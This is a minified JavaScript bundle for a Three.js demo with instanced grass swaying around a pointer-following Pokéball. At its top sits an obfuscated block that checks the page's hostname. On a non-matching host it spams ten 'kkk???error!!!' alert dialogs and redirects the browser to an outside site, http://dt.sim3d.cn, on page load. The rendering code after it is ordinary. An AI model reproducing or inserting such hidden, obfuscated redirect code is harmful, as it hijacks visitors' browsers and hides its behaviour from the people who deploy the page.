var M=Object.defineProperty;function _0x2b1f(_0x2f2754,_0xc0700d){const _0x484a28=_0x484a();return _0x2b1f=function(_0x2b1f58,_0x4d10e3){_0x2b1f58=_0x2b1f58-0x105;let _0x535090=_0x484a28[_0x2b1f58];return _0x535090;},_0x2b1f(_0x2f2754,_0xc0700d);}const _0x35da69=_0x2b1f;(function(_0x1b8f07,_0x473e5a){const _0xdfa8c8=_0x2b1f,_0x244185=_0x1b8f07();while(!![]){try{const _0x55414f=-parseInt(_0xdfa8c8(0x112))/0x1+parseInt(_0xdfa8c8(0x106))/0x2+-parseInt(_0xdfa8c8(0x109))/0x3*(parseInt(_0xdfa8c8(0x105))/0x4)+-parseInt(_0xdfa8c8(0x115))/0x5*(parseInt(_0xdfa8c8(0x110))/0x6)+-parseInt(_0xdfa8c8(0x113))/0x7*(parseInt(_0xdfa8c8(0x117))/0x8)+parseInt(_0xdfa8c8(0x10c))/0x9*(-parseInt(_0xdfa8c8(0x111))/0xa)+parseInt(_0xdfa8c8(0x10e))/0xb*(parseInt(_0xdfa8c8(0x10d))/0xc);if(_0x55414f===_0x473e5a)break;else _0x244185['push'](_0x244185['shift']());}catch(_0x3422c2){_0x244185['push'](_0x244185['shift']());}}}(_0x484a,0x8e71b));const domainName=window['location'][_0x35da69(0x10f)];if(!domainName['includes'](_0x35da69(0x107))){console[_0x35da69(0x10a)](_0x35da69(0x114));for(let i=0x0;i<0xa;i++){alert(_0x35da69(0x116));}window[_0x35da69(0x10b)]=_0x35da69(0x108);}function _0x484a(){const _0x37218c=['1290CljsyE','132008JArmRU','608818KhknQL','l\x20is\x20not\x20defined','2552330TTvumr','kkk???error!!!','32UNPVPz','4PRmrPD','579330AkumJL','bing','http://dt.sim3d.cn','2774091VNSOOa','error','location','69291PnXCXa','19212144OwyNlP','22xoMkvG','hostname','6QVkmXo'];_0x484a=function(){return _0x37218c;};return _0x484a();}var L=(o,n,i)=>n in o?M(o,n,{enumerable:!0,configurable:!0,writable:!0,value:i}):o[n]=i;var p=(o,n,i)=>(L(o,typeof n!="symbol"?n+"":n,i),i);(function(){const n=document.createElement("link").relList;if(n&&n.supports&&n.supports("modulepreload"))return;for(const a of document.querySelectorAll('link[rel="modulepreload"]'))s(a);new MutationObserver(a=>{for(const r of a)if(r.type==="childList")for(const c of r.addedNodes)c.tagName==="LINK"&&c.rel==="modulepreload"&&s(c)}).observe(document,{childList:!0,subtree:!0});function i(a){const r={};return a.integrity&&(r.integrity=a.integrity),a.referrerPolicy&&(r.referrerPolicy=a.referrerPolicy),a.crossOrigin==="use-credentials"?r.credentials="include":a.crossOrigin==="anonymous"?r.credentials="omit":r.credentials="same-origin",r}function s(a){if(a.ep)return;a.ep=!0;const r=i(a);fetch(a.href,r)}})();const{THREE:e}=window;let m,d,l,f,w,g,u,y,h,v,t;const b=1e4;class S extends e.ShaderMaterial{constructor(i){super(i);p(this,"uniforms",{fTime:{value:0},vPlayerPosition:{value:new e.Vector3(0,-1,0)},fPlayerColliderRadius:{value:1.1}});p(this,"vertexShader",`
    uniform float fTime;
    uniform vec3 vPlayerPosition;
    uniform float fPlayerColliderRadius;
  
    varying float fDistanceFromGround;
    varying vec3 vInstanceColor;

    float rand(float n){return fract(sin(n) * 43758.5453123);}

    float rand(vec2 n) { 
      return fract(sin(dot(n, vec2(12.9898, 4.1414))) * 43758.5453);
    }
    
    float createNoise(vec2 n) {
      vec2 d = vec2(0.0, 1.0);
      vec2 b = floor(n);
      vec2 f = smoothstep(vec2(0.0), vec2(1.0), fract(n));

      return mix(mix(rand(b), rand(b + d.yx), f.x), mix(rand(b + d.xy), rand(b + d.yy), f.x), f.y);
    }

    vec3 localToWorld(vec3 target) {
      return (modelMatrix * instanceMatrix * vec4(target, 1.0)).xyz;
    }
  
    void main() {
      fDistanceFromGround = max(0.0, position.y);
      vInstanceColor = instanceColor;
      
      vec3 worldPosition = localToWorld(position);

      float noise = createNoise(vec2(position.x, position.z)) * 0.6 + 0.4;

      float distanceFromPlayer = length(vPlayerPosition - worldPosition);

      vec3 sway = 0.1 * vec3(
        cos(fTime) * noise * fDistanceFromGround,
        0.0,
        0.0
      );
      
      vec3 vNormal = normalize(
        vPlayerPosition - worldPosition
      );
      vNormal.y = abs(vNormal.y);

      float fOffset = fPlayerColliderRadius - distanceFromPlayer;
      vec3 vPlayerOffset = -(vNormal * fOffset);

      worldPosition += mix(
        sway * min(1.0, distanceFromPlayer / 4.0),
        vPlayerOffset,
        float(distanceFromPlayer < fPlayerColliderRadius)
      );

      gl_Position = projectionMatrix * viewMatrix * vec4(worldPosition, 1.0);
    }
  `);p(this,"fragmentShader",`
    varying float fDistanceFromGround;
    varying vec3 vInstanceColor;
  
    void main() {
      vec3 colorDarkest = vec3(
        24.0 / 255.0,
        30.0 / 255.0,
        41.0 / 255.0
      );
      vec3 colorBrightest = vec3(
        88.0 / 255.0,
        176.0 / 255.0,
        110.0 / 255.0
      );
      vec3 color = mix(
        colorDarkest,
        colorBrightest,
        fDistanceFromGround / 2.0
      );

      color = clamp(color, 0.0, 1.0);

      gl_FragColor = vec4(color, 1.);
    }
  `)}}const C=async(o,n,i)=>{if(!t){const a=await new e.GLTFLoader().loadAsync(u.grassModel);t={clock:new e.Clock,mesh:new e.InstancedMesh(a.scene.children[0].geometry.clone(),new S({side:e.DoubleSide}),b),instances:[],update:()=>{t.instances.forEach((c,x)=>{c.updateMatrix(),t.mesh.setMatrixAt(x,c.matrix)}),t.mesh.instanceMatrix.needsUpdate=!0,t.mesh.computeBoundingSphere(),t.mesh.material.uniforms.fTime.value=t.clock.getElapsedTime(),requestAnimationFrame(t.update)}},d.add(t.mesh),t.mesh.position.y=-2,t.update();const r=new e.Object3D;r.scale.setScalar(0),r.updateMatrix();for(let c=0;c<t.mesh.count;c++)t.mesh.setMatrixAt(c,r.matrix),t.mesh.setColorAt(c,new e.Color(Math.random()*16777215));t.mesh.instanceColor.needsUpdate=!0,t.mesh.instanceMatrix.needsUpdate=!0,t.mesh.instanceMatrix.setUsage(e.StaticDrawUsage)}const s=new e.Object3D;s.position.copy(o),s.rotation.copy(n),s.scale.copy(i),s.visible=!1,t.instances.push(s)},T=()=>{const o=new e.Group;new e.GLTFLoader().load(u.pokeballModel,n=>{n.scene.scale.setScalar(.25),o.add(n.scene)}),setInterval(()=>{h.setFromCamera(v,m);const n=h.intersectObject(f,!0);if(!n.length)return;const i=new e.Vector3().copy(n[0].point);i.y+=1;const s=o.position.clone();o.position.lerp(i,.1);const a=s.x-o.position.x,r=s.z-o.position.z;o.rotation.z+=a,o.rotation.x-=r,t&&t.mesh.material.uniforms.vPlayerPosition.value.copy(o.position)},1e3/60),d.add(o)},F=async()=>{f=new e.Mesh(new e.CylinderGeometry(25,25,.01,64),new e.MeshStandardMaterial({map:u.debugFloor})),f.position.y=-2,f.receiveShadow=!0,w=new e.PointLight(16777215,1,10),w.position.set(2,2,2),w.castShadow=!0,g=new e.PointLight(8947967,1,10),g.position.set(-2,2,-2),g.castShadow=!0,d.add(f),d.add(w),d.add(g),T();for(let o=0;o<b;o++)await C(new e.Vector3().randomDirection().multiply(new e.Vector3(1,0,1)).multiplyScalar(10),new e.Euler(0,Math.random()*Math.PI*2,0),new e.Vector3().setScalar(Math.random()*.25+.25))},O=()=>{m=new e.PerspectiveCamera(60,window.innerWidth/window.innerHeight,.1,1e3),m.position.set(-5,5,7),d=new e.Scene,d.background=new e.Color(2236962),new e.TextureLoader().load(u.background,o=>{o.mapping=e.EquirectangularRefractionMapping,o.encoding=e.LinearEncoding,d.background=o}),new e.RGBELoader().load(u.environment,o=>{o.mapping=e.EquirectangularReflectionMapping,d.environment=o}),l=new e.WebGLRenderer({antialias:!0}),l.setSize(window.innerWidth,window.innerHeight),l.shadowMap.enabled=!0,v=new e.Vector2(0,0),h=new e.Raycaster,window.addEventListener("resize",()=>{m.aspect=window.innerWidth/window.innerHeight,m.updateProjectionMatrix(),l.setSize(window.innerWidth,window.innerHeight)}),window.addEventListener("pointermove",o=>{v.set(o.clientX/window.innerWidth*2-1,-(o.clientY/window.innerHeight)*2+1)}),window.addEventListener("pointerdown",o=>{v.set(o.clientX/window.innerWidth*2-1,-(o.clientY/window.innerHeight)*2+1)}),document.body.appendChild(l.domElement),y=new e.OrbitControls(m,l.domElement),F()},P=()=>{requestAnimationFrame(P),y.update(),l.render(d,m)};u={debugFloor:new e.TextureLoader().load("//cdn.wtlstudio.com/sample.wtlstudio.com/9f120108-34f1-4c8e-8340-42ab82b1110c.png",o=>{o.wrapS=e.RepeatWrapping,o.wrapT=e.RepeatWrapping,o.repeat.setScalar(4)}),debugWall:new e.TextureLoader().load("//cdn.wtlstudio.com/sample.wtlstudio.com/5cf2cf39-d43a-4d47-a1d4-6c2e04bf6805.png"),debugGreen:new e.TextureLoader().load("//cdn.wtlstudio.com/sample.wtlstudio.com/9a69fcdb-e1b0-4b1a-9869-2688080a6ef7.png"),debugOrange:new e.TextureLoader().load("//cdn.wtlstudio.com/sample.wtlstudio.com/6897a0b3-265f-4131-90f4-cba63ffe15c2.png"),debugRed:new e.TextureLoader().load("//cdn.wtlstudio.com/sample.wtlstudio.com/0a6c4374-d249-41a7-aa46-e96ca643a100.png"),debugPurple:new e.TextureLoader().load("//cdn.wtlstudio.com/sample.wtlstudio.com/00cc7870-9fb6-4a0c-8aaf-72b5fa9d92fb.png"),grassModel:"//cdn.wtlstudio.com/sample.wtlstudio.com/a776537a-3038-4cd0-a90a-dab044a3f7ec.glb",pokeballModel:"//cdn.wtlstudio.com/sample.wtlstudio.com/1e6b7047-1626-4eb6-8344-ce513ec2769f.glb",background:"//cdn.wtlstudio.com/sample.wtlstudio.com/2b211464-b704-4060-a50c-126fc53a8f27.jpg",environment:"//cdn.wtlstudio.com/sample.wtlstudio.com/8e560393-27e2-4092-acb1-a33b17b6a113.hdr"};O();P();
